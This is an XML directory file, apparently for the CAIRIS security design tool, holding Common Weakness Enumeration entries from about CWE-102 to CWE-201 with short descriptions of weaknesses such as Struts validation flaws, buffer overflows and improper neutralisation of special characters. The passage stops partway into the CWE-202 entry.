<?xml version="1.0"?>
<!DOCTYPE directory PUBLIC "-//CAIRIS/DTD DIRECTORY 1.0//EN" "http://cairis.org/dtd/directory.dtd">

<directory>
<vulnerability label="CWE-102" name="Struts: Duplicate Validation Forms" type="Variant" reference="CWE">
  <description>The application uses multiple validation forms with the same name, which might cause the Struts Validator to validate a form that the programmer does not expect.If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the other. This decision might not correspond to the programmer's expectations, possibly leading to resultant weaknesses. Moreover, it indicates that the validation logic is not up-to-date, and can indicate that other, more subtle validation errors are present.</description>
</vulnerability>
<vulnerability label="CWE-103" name="Struts: Incomplete validate() Method Definition" type="Variant" reference="CWE">
  <description>The application has a validator form that either does not define a validate() method, or defines a validate() method but does not call super.validate().If you do not call super.validate(), the Validation Framework cannot check the contents of the form against a validation form. In other words, the validation framework will be disabled for the given form.</description>
</vulnerability>
<vulnerability label="CWE-104" name="Struts: Form Bean Does Not Extend Validation Class" type="Variant" reference="CWE">
  <description>If a form bean does not extend an ActionForm subclass of the Validator framework, it can expose the application to other weaknesses related to insufficient input validation.</description>
</vulnerability>
<vulnerability label="CWE-105" name="Struts: Form Field Without Validator" type="Variant" reference="CWE">
  <description>The application has a form field that is not validated by a corresponding validation form, which can introduce other weaknesses related to insufficient input validation.</description>
</vulnerability>
<vulnerability label="CWE-106" name="Struts: Plug-in Framework not in Use" type="Variant" reference="CWE">
  <description>When an application does not use an input validation framework such as the Struts Validator, there is a greater risk of introducing weaknesses related to insufficient input validation.</description>
</vulnerability>
<vulnerability label="CWE-107" name="Struts: Unused Validation Form" type="Variant" reference="CWE">
  <description>An unused validation form indicates that validation logic is not up-to-date.It is easy for developers to forget to update validation logic when they remove or rename action form mappings. One indication that validation logic is not being properly maintained is the presence of an unused validation form.</description>
</vulnerability>
<vulnerability label="CWE-108" name="Struts: Unvalidated Action Form" type="Variant" reference="CWE">
  <description>Every Action Form must have a corresponding validation form.If a Struts Action Form Mapping specifies a form, it must have a validation form defined under the Struts Validator.</description>
</vulnerability>
<vulnerability label="CWE-109" name="Struts: Validator Turned Off" type="Variant" reference="CWE">
  <description>Automatic filtering via a Struts bean has been turned off, which disables the Struts Validator and custom validation logic. This exposes the application to other weaknesses related to insufficient input validation.</description>
</vulnerability>
<vulnerability label="CWE-11" name="ASP.NET Misconfiguration: Creating Debug Binary" type="Variant" reference="CWE">
  <description>Debugging messages help attackers learn about the system and plan a form of attack.ASP .NET applications can be configured to produce debug binaries. These binaries give detailed debugging messages and should not be used in production environments. Debug binaries are meant to be used in a development or testing environment and can pose a security risk if they are deployed to production.</description>
</vulnerability>
<vulnerability label="CWE-110" name="Struts: Validator Without Form Field" type="Variant" reference="CWE">
  <description>Validation fields that do not appear in forms they are associated with indicate that the validation logic is out of date.It is easy for developers to forget to update validation logic when they make changes to an ActionForm class. One indication that validation logic is not being properly maintained is inconsistencies between the action form and the validation form.</description>
</vulnerability>
<vulnerability label="CWE-111" name="Direct Use of Unsafe JNI" type="Base" reference="CWE">
  <description>When a Java application uses the Java Native Interface (JNI) to call code written in another programming language, it can expose the application to weaknesses in that code, even if those weaknesses cannot occur in Java.Many safety features that programmers may take for granted simply do not apply for native code, so you must carefully review all such code for potential problems. The languages used to implement native code may be more susceptible to buffer overflows and other attacks. Native code is unprotected by the security features enforced by the runtime environment, such as strong typing and array bounds checking.</description>
</vulnerability>
<vulnerability label="CWE-112" name="Missing XML Validation" type="Base" reference="CWE">
  <description>The software accepts XML from an untrusted source but does not validate the XML against the proper schema.Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input.</description>
</vulnerability>
<vulnerability label="CWE-113" name="Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')" type="Base" reference="CWE">
  <description>The software receives data from an upstream component, but does not neutralize or incorrectly neutralizes CR and LF characters before the data is included in outgoing HTTP headers.Including unvalidated data in an HTTP header allows an attacker to specify the entirety of the HTTP response rendered by the browser. When an HTTP request contains unexpected CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n) characters the server may respond with an output stream that is interpreted as two different HTTP responses (instead of one). An attacker can control the second response and mount attacks such as cross-site scripting and cache poisoning attacks.HTTP response splitting weaknesses may be present when:Data enters a web application through an untrusted source, most frequently an HTTP request.The data is included in an HTTP response header sent to a web user without being validated for malicious characters.</description>
</vulnerability>
<vulnerability label="CWE-114" name="Process Control" type="Base" reference="CWE">
  <description>Executing commands or loading libraries from an untrusted source or in an untrusted environment can cause an application to execute malicious commands (and payloads) on behalf of an attacker.Process control vulnerabilities take two forms: 1. An attacker can change the command that the program executes: the attacker explicitly controls what the command is. 2. An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means. Process control vulnerabilities of the first type occur when either data enters the application from an untrusted source and the data is used as part of a string representing a command that is executed by the application. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.</description>
</vulnerability>
<vulnerability label="CWE-115" name="Misinterpretation of Input" type="Base" reference="CWE">
  <description>The software misinterprets an input, whether from an attacker or another product, in a security-relevant fashion.</description>
</vulnerability>
<vulnerability label="CWE-116" name="Improper Encoding or Escaping of Output" type="Class" reference="CWE">
  <description>The software prepares a structured message for communication with another component, but encoding or escaping of the data is either missing or done incorrectly. As a result, the intended structure of the message is not preserved.Improper encoding or escaping can allow attackers to change the commands that are sent to another component, inserting malicious commands instead.Most software follows a certain protocol that uses structured messages for communication between components, such as queries or commands. These structured messages can contain raw data interspersed with metadata or control information. For example, &quot;GET /index.html HTTP/1.1&quot; is a structured message containing a command (&quot;GET&quot;) with a single argument (&quot;/index.html&quot;) and metadata about which protocol version is being used (&quot;HTTP/1.1&quot;).If an application uses attacker-supplied inputs to construct a structured message without properly encoding or escaping, then the attacker could insert special characters that will cause the data to be interpreted as control information or metadata. Consequently, the component that receives the output will perform the wrong operations, or otherwise interpret the data incorrectly.</description>
</vulnerability>
<vulnerability label="CWE-117" name="Improper Output Neutralization for Logs" type="Base" reference="CWE">
  <description>The software does not neutralize or incorrectly neutralizes output that is written to logs.This can allow an attacker to forge log entries or inject malicious content into logs.Log forging vulnerabilities occur when:Data enters an application from an untrusted source.The data is written to an application or system log file.</description>
</vulnerability>
<vulnerability label="CWE-118" name="Improper Access of Indexable Resource ('Range Error')" type="Class" reference="CWE">
  <description>The software does not restrict or incorrectly restricts operations within the boundaries of a resource that is accessed using an index or pointer, such as memory or files.</description>
</vulnerability>
<vulnerability label="CWE-119" name="Improper Restriction of Operations within the Bounds of a Memory Buffer" type="Class" reference="CWE">
  <description>The software performs operations on a memory buffer, but it can read from or write to a memory location that is outside of the intended boundary of the buffer.Certain languages allow direct addressing of memory locations and do not automatically ensure that these locations are valid for the memory buffer that is being referenced. This can cause read or write operations to be performed on memory locations that may be associated with other variables, data structures, or internal program data.As a result, an attacker may be able to execute arbitrary code, alter the intended control flow, read sensitive information, or cause the system to crash.</description>
</vulnerability>
<vulnerability label="CWE-12" name="ASP.NET Misconfiguration: Missing Custom Error Page" type="Variant" reference="CWE">
  <description>An ASP .NET application must enable custom error pages in order to prevent attackers from mining information from the framework's built-in responses.</description>
</vulnerability>
<vulnerability label="CWE-120" name="Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')" type="Base" reference="CWE">
  <description>The program copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow.A buffer overflow condition exists when a program attempts to put more data in a buffer than it can hold, or when a program attempts to put data in a memory area outside of the boundaries of a buffer. The simplest type of error, and the most common cause of buffer overflows, is the &quot;classic&quot; case in which the program copies the buffer without restricting how much is copied. Other variants exist, but the existence of a classic overflow strongly suggests that the programmer is not considering even the most basic of security protections.</description>
</vulnerability>
<vulnerability label="CWE-121" name="Stack-based Buffer Overflow" type="Variant" reference="CWE">
  <description>A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function).</description>
</vulnerability>
<vulnerability label="CWE-122" name="Heap-based Buffer Overflow" type="Variant" reference="CWE">
  <description>A heap overflow condition is a buffer overflow, where the buffer that can be overwritten is allocated in the heap portion of memory, generally meaning that the buffer was allocated using a routine such as malloc().</description>
</vulnerability>
<vulnerability label="CWE-123" name="Write-what-where Condition" type="Base" reference="CWE">
  <description>Any condition where the attacker has the ability to write an arbitrary value to an arbitrary location, often as the result of a buffer overflow.</description>
</vulnerability>
<vulnerability label="CWE-124" name="Buffer Underwrite ('Buffer Underflow')" type="Base" reference="CWE">
  <description>The software writes to a buffer using an index or pointer that references a memory location prior to the beginning of the buffer.This typically occurs when a pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used.</description>
</vulnerability>
<vulnerability label="CWE-125" name="Out-of-bounds Read" type="Base" reference="CWE">
  <description>The software reads data past the end, or before the beginning, of the intended buffer. This typically occurs when the pointer or its index is incremented or decremented to a position beyond the bounds of the buffer or when pointer arithmetic results in a position outside of the valid memory location to name a few. This may result in corruption of sensitive information, a crash, or code execution among other things.</description>
</vulnerability>
<vulnerability label="CWE-126" name="Buffer Over-read" type="Variant" reference="CWE">
  <description>The software reads from a buffer using buffer access mechanisms such as indexes or pointers that reference memory locations after the targeted buffer.This typically occurs when the pointer or its index is incremented to a position beyond the bounds of the buffer or when pointer arithmetic results in a position outside of the valid memory location to name a few. This may result in exposure of sensitive information or possibly a crash.</description>
</vulnerability>
<vulnerability label="CWE-127" name="Buffer Under-read" type="Variant" reference="CWE">
  <description>The software reads from a buffer using buffer access mechanisms such as indexes or pointers that reference memory locations prior to the targeted buffer. This typically occurs when the pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used. This may result in exposure of sensitive information or possibly a crash.</description>
</vulnerability>
<vulnerability label="CWE-128" name="Wrap-around Error" type="Base" reference="CWE">
  <description>Wrap around errors occur whenever a value is incremented past the maximum value for its type and therefore &quot;wraps around&quot; to a very small, negative, or undefined value.</description>
</vulnerability>
<vulnerability label="CWE-129" name="Improper Validation of Array Index" type="Base" reference="CWE">
  <description>The product uses untrusted input when calculating or using an array index, but the product does not validate or incorrectly validates the index to ensure the index references a valid position within the array.</description>
</vulnerability>
<vulnerability label="CWE-13" name="ASP.NET Misconfiguration: Password in Configuration File" type="Variant" reference="CWE">
  <description>Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource making them an easy target for attackers.</description>
</vulnerability>
<vulnerability label="CWE-130" name="Improper Handling of Length Parameter Inconsistency " type="Base" reference="CWE">
  <description>The software parses a formatted message or structure, but it does not handle or incorrectly handles a length field that is inconsistent with the actual length of the associated data.If an attacker can manipulate the length parameter associated with an input such that it is inconsistent with the actual length of the input, this can be leveraged to cause the target application to behave in unexpected, and possibly, malicious ways. One of the possible motives for doing so is to pass in arbitrarily large input to the application. Another possible motivation is the modification of application state by including invalid data for subsequent properties of the application. Such weaknesses commonly lead to attacks such as buffer overflows and execution of arbitrary code.</description>
</vulnerability>
<vulnerability label="CWE-131" name="Incorrect Calculation of Buffer Size" type="Base" reference="CWE">
  <description>The software does not correctly calculate the size to be used when allocating a buffer, which could lead to a buffer overflow.</description>
</vulnerability>
<vulnerability label="CWE-132" name="DEPRECATED (Duplicate): Miscalculated Null Termination" type="Base" reference="CWE">
  <description>This entry has been deprecated because it was a duplicate of CWE-170. All content has been transferred to CWE-170.</description>
</vulnerability>
<vulnerability label="CWE-134" name="Uncontrolled Format String" type="Base" reference="CWE">
  <description>The software uses externally-controlled format strings in printf-style functions, which can lead to buffer overflows or data representation problems.</description>
</vulnerability>
<vulnerability label="CWE-135" name="Incorrect Calculation of Multi-Byte String Length" type="Base" reference="CWE">
  <description>The software does not correctly calculate the length of strings that can contain wide or multi-byte characters.</description>
</vulnerability>
<vulnerability label="CWE-138" name="Improper Neutralization of Special Elements" type="Class" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as control elements or syntactic markers when they are sent to a downstream component.Most languages and protocols have their own special elements such as characters and reserved words. These special elements can carry control implications. If software does not prevent external control or influence over the inclusion of such special elements, the control flow of the program may be altered from what was intended. For example, both Unix and Windows interpret the symbol &lt; (&quot;less than&quot;) as meaning &quot;read input from a file&quot;.</description>
</vulnerability>
<vulnerability label="CWE-14" name="Compiler Removal of Code to Clear Buffers" type="Base" reference="CWE">
  <description>Sensitive memory is cleared according to the source code, but compiler optimizations leave the memory untouched when it is not read from again, aka &quot;dead store removal.&quot;This compiler optimization error occurs when:1. Secret data are stored in memory.2. The secret data are scrubbed from memory by overwriting its contents.3. The source code is compiled using an optimizing compiler, which identifies and removes the function that overwrites the contents as a dead store because the memory is not used subsequently.</description>
</vulnerability>
<vulnerability label="CWE-140" name="Improper Neutralization of Delimiters" type="Base" reference="CWE">
  <description>The software does not neutralize or incorrectly neutralizes delimiters.</description>
</vulnerability>
<vulnerability label="CWE-141" name="Improper Neutralization of Parameter/Argument Delimiters" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as parameter or argument delimiters when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.</description>
</vulnerability>
<vulnerability label="CWE-142" name="Improper Neutralization of Value Delimiters" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as value delimiters when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.</description>
</vulnerability>
<vulnerability label="CWE-143" name="Improper Neutralization of Record Delimiters" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as record delimiters when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.</description>
</vulnerability>
<vulnerability label="CWE-144" name="Improper Neutralization of Line Delimiters" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as line delimiters when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.</description>
</vulnerability>
<vulnerability label="CWE-145" name="Improper Neutralization of Section Delimiters" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as section delimiters when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.One example of a section delimiter is the boundary string in a multipart MIME message. In many cases, doubled line delimiters can serve as a section delimiter.</description>
</vulnerability>
<vulnerability label="CWE-146" name="Improper Neutralization of Expression/Command Delimiters" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as expression or command delimiters when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.</description>
</vulnerability>
<vulnerability label="CWE-147" name="Improper Neutralization of Input Terminators" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as input terminators when they are sent to a downstream component.For example, a &quot;.&quot; in SMTP signifies the end of mail message data, whereas a null character can be used for the end of a string.</description>
</vulnerability>
<vulnerability label="CWE-148" name="Improper Neutralization of Input Leaders" type="Variant" reference="CWE">
  <description>The application does not properly handle when a leading character or sequence (&quot;leader&quot;) is missing or malformed, or if multiple leaders are used when only one should be allowed.</description>
</vulnerability>
<vulnerability label="CWE-149" name="Improper Neutralization of Quoting Syntax" type="Variant" reference="CWE">
  <description>Quotes injected into an application can be used to compromise a system. As data are parsed, an injected/absent/duplicate/malformed use of quotes may cause the process to take unexpected actions.</description>
</vulnerability>
<vulnerability label="CWE-15" name="External Control of System or Configuration Setting" type="Base" reference="CWE">
  <description>One or more system settings or configuration elements can be externally controlled by a user.Allowing external control of system settings can disrupt service or cause an application to behave in unexpected, and potentially malicious ways.</description>
</vulnerability>
<vulnerability label="CWE-150" name="Improper Neutralization of Escape, Meta, or Control Sequences" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as escape, meta, or control character sequences when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.</description>
</vulnerability>
<vulnerability label="CWE-151" name="Improper Neutralization of Comment Delimiters" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as comment delimiters when they are sent to a downstream component.</description>
</vulnerability>
<vulnerability label="CWE-152" name="Improper Neutralization of Macro Symbols" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as macro symbols when they are sent to a downstream component.</description>
</vulnerability>
<vulnerability label="CWE-153" name="Improper Neutralization of Substitution Characters" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as substitution characters when they are sent to a downstream component.</description>
</vulnerability>
<vulnerability label="CWE-154" name="Improper Neutralization of Variable Name Delimiters" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as variable name delimiters when they are sent to a downstream component.As data is parsed, an injected delimiter may cause the process to take unexpected actions that result in an attack. Example: &quot;$&quot; for an environment variable.</description>
</vulnerability>
<vulnerability label="CWE-155" name="Improper Neutralization of Wildcards or Matching Symbols" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as wildcards or matching symbols when they are sent to a downstream component.As data is parsed, an injected element may cause the process to take unexpected actions.</description>
</vulnerability>
<vulnerability label="CWE-156" name="Improper Neutralization of Whitespace" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as whitespace when they are sent to a downstream component.This can include space, tab, etc.</description>
</vulnerability>
<vulnerability label="CWE-157" name="Failure to Sanitize Paired Delimiters" type="Variant" reference="CWE">
  <description>The software does not properly handle the characters that are used to mark the beginning and ending of a group of entities, such as parentheses, brackets, and braces.</description>
</vulnerability>
<vulnerability label="CWE-158" name="Improper Neutralization of Null Byte or NUL Character" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes NUL characters or null bytes when they are sent to a downstream component.As data is parsed, an injected NUL character or null byte may cause the software to believe the input is terminated earlier than it actually is, or otherwise cause the input to be misinterpreted. This could then be used to inject potentially dangerous input that occurs after the null byte or otherwise bypass validation routines and other protection mechanisms.</description>
</vulnerability>
<vulnerability label="CWE-159" name="Failure to Sanitize Special Element" type="Class" reference="CWE">
  <description>Weaknesses in this attack-focused category do not properly filter and interpret special elements in user-controlled input which could cause adverse effect on the software behavior and integrity.</description>
</vulnerability>
<vulnerability label="CWE-160" name="Improper Neutralization of Leading Special Elements" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes leading special elements that could be interpreted in unexpected ways when they are sent to a downstream component.As data is parsed, improperly handled leading special elements may cause the process to take unexpected actions that result in an attack.</description>
</vulnerability>
<vulnerability label="CWE-161" name="Improper Neutralization of Multiple Leading Special Elements" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes multiple leading special elements that could be interpreted in unexpected ways when they are sent to a downstream component.As data is parsed, improperly handled multiple leading special elements may cause the process to take unexpected actions that result in an attack.</description>
</vulnerability>
<vulnerability label="CWE-162" name="Improper Neutralization of Trailing Special Elements" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes trailing special elements that could be interpreted in unexpected ways when they are sent to a downstream component.As data is parsed, improperly handled trailing special elements may cause the process to take unexpected actions that result in an attack.</description>
</vulnerability>
<vulnerability label="CWE-163" name="Improper Neutralization of Multiple Trailing Special Elements" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes multiple trailing special elements that could be interpreted in unexpected ways when they are sent to a downstream component.As data is parsed, improperly handled multiple trailing special elements may cause the process to take unexpected actions that result in an attack.</description>
</vulnerability>
<vulnerability label="CWE-164" name="Improper Neutralization of Internal Special Elements" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes internal special elements that could be interpreted in unexpected ways when they are sent to a downstream component.As data is parsed, improperly handled internal special elements may cause the process to take unexpected actions that result in an attack.</description>
</vulnerability>
<vulnerability label="CWE-165" name="Improper Neutralization of Multiple Internal Special Elements" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes multiple internal special elements that could be interpreted in unexpected ways when they are sent to a downstream component.As data is parsed, improperly handled multiple internal special elements may cause the process to take unexpected actions that result in an attack.</description>
</vulnerability>
<vulnerability label="CWE-166" name="Improper Handling of Missing Special Element" type="Base" reference="CWE">
  <description>The software receives input from an upstream component, but it does not handle or incorrectly handles when an expected special element is missing.</description>
</vulnerability>
<vulnerability label="CWE-167" name="Improper Handling of Additional Special Element" type="Base" reference="CWE">
  <description>The software receives input from an upstream component, but it does not handle or incorrectly handles when an additional unexpected special element is missing.</description>
</vulnerability>
<vulnerability label="CWE-168" name="Improper Handling of Inconsistent Special Elements" type="Base" reference="CWE">
  <description>The software does not handle when an inconsistency exists between two or more special characters or reserved words.An example of this problem would be if paired characters appear in the wrong order, or if the special characters are not properly nested.</description>
</vulnerability>
<vulnerability label="CWE-170" name="Improper Null Termination" type="Base" reference="CWE">
  <description>The software does not terminate or incorrectly terminates a string or array with a null character or equivalent terminator.Null termination errors frequently occur in two different ways. An off-by-one error could cause a null to be written out of bounds, leading to an overflow. Or, a program could use a strncpy() function call incorrectly, which prevents a null terminator from being added at all. Other scenarios are possible.</description>
</vulnerability>
<vulnerability label="CWE-172" name="Encoding Error" type="Class" reference="CWE">
  <description>The software does not properly encode or decode the data, resulting in unexpected values.</description>
</vulnerability>
<vulnerability label="CWE-173" name="Improper Handling of Alternate Encoding" type="Variant" reference="CWE">
  <description>The software does not properly handle when an input uses an alternate encoding that is valid for the control sphere to which the input is being sent.</description>
</vulnerability>
<vulnerability label="CWE-174" name="Double Decoding of the Same Data" type="Variant" reference="CWE">
  <description>The software decodes the same input twice, which can limit the effectiveness of any protection mechanism that occurs in between the decoding operations.</description>
</vulnerability>
<vulnerability label="CWE-175" name="Improper Handling of Mixed Encoding" type="Variant" reference="CWE">
  <description>The software does not properly handle when the same input uses several different (mixed) encodings.</description>
</vulnerability>
<vulnerability label="CWE-176" name="Improper Handling of Unicode Encoding" type="Variant" reference="CWE">
  <description>The software does not properly handle when an input contains Unicode encoding.</description>
</vulnerability>
<vulnerability label="CWE-177" name="Improper Handling of URL Encoding (Hex Encoding)" type="Variant" reference="CWE">
  <description>The software does not properly handle when all or part of an input has been URL encoded.</description>
</vulnerability>
<vulnerability label="CWE-178" name="Improper Handling of Case Sensitivity" type="Base" reference="CWE">
  <description>The software does not properly account for differences in case sensitivity when accessing or determining the properties of a resource, leading to inconsistent results.Improperly handled case sensitive data can lead to several possible consequences, including:case-insensitive passwords reducing the size of the key space, making brute force attacks easierbypassing filters or access controls using alternate namesmultiple interpretation errors using alternate names.</description>
</vulnerability>
<vulnerability label="CWE-179" name="Incorrect Behavior Order: Early Validation" type="Base" reference="CWE">
  <description>The software validates input before applying protection mechanisms that modify the input, which could allow an attacker to bypass the validation via dangerous inputs that only arise after the modification.Software needs to validate data at the proper time, after data has been canonicalized and cleansed. Early validation is susceptible to various manipulations that result in dangerous inputs that are produced by canonicalization and cleansing.</description>
</vulnerability>
<vulnerability label="CWE-180" name="Incorrect Behavior Order: Validate Before Canonicalize" type="Base" reference="CWE">
  <description>The software validates input before it is canonicalized, which prevents the software from detecting data that becomes invalid after the canonicalization step.This can be used by an attacker to bypass the validation and launch attacks that expose weaknesses that would otherwise be prevented, such as injection.</description>
</vulnerability>
<vulnerability label="CWE-181" name="Incorrect Behavior Order: Validate Before Filter" type="Base" reference="CWE">
  <description>The software validates data before it has been filtered, which prevents the software from detecting data that becomes invalid after the filtering step.This can be used by an attacker to bypass the validation and launch attacks that expose weaknesses that would otherwise be prevented, such as injection.</description>
</vulnerability>
<vulnerability label="CWE-182" name="Collapse of Data into Unsafe Value" type="Base" reference="CWE">
  <description>The software filters data in a way that causes it to be reduced or &quot;collapsed&quot; into an unsafe value that violates an expected security property.</description>
</vulnerability>
<vulnerability label="CWE-183" name="Permissive Whitelist" type="Base" reference="CWE">
  <description>An application uses a &quot;whitelist&quot; of acceptable values, but the whitelist includes at least one unsafe value, leading to resultant weaknesses.</description>
</vulnerability>
<vulnerability label="CWE-184" name="Incomplete Blacklist" type="Base" reference="CWE">
  <description>An application uses a &quot;blacklist&quot; of prohibited values, but the blacklist is incomplete.If an incomplete blacklist is used as a security mechanism, then the software may allow unintended values to pass into the application logic.</description>
</vulnerability>
<vulnerability label="CWE-185" name="Incorrect Regular Expression" type="Class" reference="CWE">
  <description>The software specifies a regular expression in a way that causes data to be improperly matched or compared.When the regular expression is used in protection mechanisms such as filtering or validation, this may allow an attacker to bypass the intended restrictions on the incoming data.</description>
</vulnerability>
<vulnerability label="CWE-186" name="Overly Restrictive Regular Expression" type="Base" reference="CWE">
  <description>A regular expression is overly restrictive, which prevents dangerous values from being detected.</description>
</vulnerability>
<vulnerability label="CWE-187" name="Partial Comparison" type="Base" reference="CWE">
  <description>The software performs a comparison that only examines a portion of a factor before determining whether there is a match, such as a substring, leading to resultant weaknesses.For example, an attacker might succeed in authentication by providing a small password that matches the associated portion of the larger, correct password.</description>
</vulnerability>
<vulnerability label="CWE-188" name="Reliance on Data/Memory Layout" type="Base" reference="CWE">
  <description>The software makes invalid assumptions about how protocol data or memory is organized at a lower level, resulting in unintended program behavior.</description>
</vulnerability>
<vulnerability label="CWE-190" name="Integer Overflow or Wraparound" type="Base" reference="CWE">
  <description>The software performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.An integer overflow or wraparound occurs when an integer value is incremented to a value that is too large to store in the associated representation. When this occurs, the value may wrap to become a very small or negative number. While this may be intended behavior in circumstances that rely on wrapping, it can have security consequences if the wrap is unexpected. This is especially the case if the integer overflow can be triggered using user-supplied inputs. This becomes security-critical when the result is used to control looping, make a security decision, or determine the offset or size in behaviors such as memory allocation, copying, concatenation, etc.</description>
</vulnerability>
<vulnerability label="CWE-191" name="Integer Underflow (Wrap or Wraparound)" type="Base" reference="CWE">
  <description>The product subtracts one value from another, such that the result is less than the minimum allowable integer value, which produces a value that is not equal to the correct result.This can happen in signed and unsigned cases.</description>
</vulnerability>
<vulnerability label="CWE-193" name="Off-by-one Error" type="Base" reference="CWE">
  <description>A product calculates or uses an incorrect maximum or minimum value that is 1 more, or 1 less, than the correct value.</description>
</vulnerability>
<vulnerability label="CWE-194" name="Unexpected Sign Extension" type="Base" reference="CWE">
  <description>The software performs an operation on a number that causes it to be sign extended when it is transformed into a larger data type. When the original number is negative, this can produce unexpected values that lead to resultant weaknesses.</description>
</vulnerability>
<vulnerability label="CWE-195" name="Signed to Unsigned Conversion Error" type="Variant" reference="CWE">
  <description>A signed-to-unsigned conversion error takes place when a signed primitive is used as an unsigned value, usually as a size variable. It is dangerous to rely on implicit casts between signed and unsigned numbers because the result can take on an unexpected value and violate assumptions made by the program.</description>
</vulnerability>
<vulnerability label="CWE-196" name="Unsigned to Signed Conversion Error" type="Variant" reference="CWE">
  <description>An unsigned-to-signed conversion error takes place when a large unsigned primitive is used as a signed value.</description>
</vulnerability>
<vulnerability label="CWE-197" name="Numeric Truncation Error" type="Base" reference="CWE">
  <description>Truncation errors occur when a primitive is cast to a primitive of a smaller size and data is lost in the conversion.When a primitive is cast to a smaller primitive, the high order bits of the large value are lost in the conversion, potentially resulting in an unexpected value that is not equal to the original value. This value may be required as an index into a buffer, a loop iterator, or simply necessary state data. In any case, the value cannot be trusted and the system will be in an undefined state. While this method may be employed viably to isolate the low bits of a value, this usage is rare, and truncation usually implies that an implementation error has occurred.</description>
</vulnerability>
<vulnerability label="CWE-198" name="Use of Incorrect Byte Ordering" type="Base" reference="CWE">
  <description>The software receives input from an upstream component, but it does not account for byte ordering (e.g. big-endian and little-endian) when processing the input, causing an incorrect number or value to be used.</description>
</vulnerability>
<vulnerability label="CWE-20" name="Improper Input Validation" type="Class" reference="CWE">
  <description>The product does not validate or incorrectly validates input that can affect the control flow or data flow of a program.When software does not validate input properly, an attacker is able to craft the input in a form that is not expected by the rest of the application. This will lead to parts of the system receiving unintended input, which may result in altered control flow, arbitrary control of a resource, or arbitrary code execution.</description>
</vulnerability>
<vulnerability label="CWE-200" name="Information Exposure" type="Class" reference="CWE">
  <description>An information exposure is the intentional or unintentional disclosure of information to an actor that is not explicitly authorized to have access to that information.The information eitheris regarded as sensitive within the product's own functionality, such as a private message; orprovides information about the product or its environment that could be useful in an attack but is normally not available to the attacker, such as the installation path of a product that is remotely accessible.Many information exposures are resultant (e.g. PHP script error revealing the full path of the program), but they can also be primary (e.g. timing discrepancies in cryptography). There are many different types of problems that involve information exposures. Their severity can range widely depending on the type of information that is revealed.</description>
</vulnerability>
<vulnerability label="CWE-201" name="Information Exposure Through Sent Data" type="Variant" reference="CWE">
  <description>The accidental exposure of sensitive information through sent data refers to the transmission of data which are either sensitive in and of itself or useful in the further exploitation of the system through standard data channels.</description>
</vulnerability>
<vulnerability label="CWE-202" name="Exposure of Sensitive Data Through Data Queries" type="Variant" reference="CWE">
